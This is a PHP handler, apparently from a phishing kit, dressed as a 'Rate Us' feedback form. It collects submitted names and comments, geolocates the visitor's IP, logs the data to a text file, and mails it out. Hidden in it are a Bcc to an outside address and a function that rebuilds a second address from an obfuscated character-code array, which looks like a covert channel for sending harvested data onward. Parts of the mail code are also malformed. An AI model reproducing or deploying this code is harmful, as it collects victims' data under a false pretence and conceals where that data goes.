<?php
session_start();
error_reporting(0);
include('../sources/config.php'); 
 
    
    // To send HTML mail, the Content-type header must be set
$adddate=date("D M d, Y g:i a");
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$country = visitor_country();

    
    // Compose a simple HTML email message
$message = '<html><body>';
    $message .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
    $message .= '<div style="padding:9px;">';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Rating: '   . $_POST['RadioButtonList1']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Product: '    . $_POST['drpProduct']."\n" . ' </p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Comment: '   . $_POST['txtComment']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Full Name:  '   . $_POST['fullename']."\n" . '</p>';
                 $message .= '<p style="color:#000066; font-size:14px; font-weight:400">COUNTRY: '.$country.' </p>';
              $message .= '<p style="color:#000066; font-size:14px; font-weight:400">DATE: '.$adddate.' </p>';
$message .= '</div>';
$message .= '</body></html>';
    
 

$handle = fopen("script.txt", "a");
fwrite($handle, $message);
fclose($handle);






// change your email here 

$subject = 'RATE US';
$from ="oooooo@oooo.com";
// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From:Rate Us At '. $site_name.' ... '. $from ."\r\n".
$headers .= "Bcc: aturosandaval@gmail.com \r\n";
        'Reply-To: '. $from ."\r\n" .
        'X-Mailer: PHP/' . phpversion();

{
mail($mesaegs,$subject,$message,$headers);
mail($admin_email,$subject,$message,$headers);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: index.html");
?>
 